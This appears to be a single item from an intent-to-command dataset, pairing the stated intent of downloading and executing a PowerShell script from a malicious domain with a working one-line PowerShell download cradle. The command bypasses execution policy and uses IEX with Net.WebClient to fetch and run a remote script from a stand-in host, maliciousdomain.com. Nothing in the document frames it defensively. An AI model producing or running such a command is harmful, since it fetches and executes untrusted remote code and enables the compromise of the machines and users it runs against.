# Natural language intent:
# Download and execute a PowerShell script from a malicious domain.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/maliciousscript.ps1')"
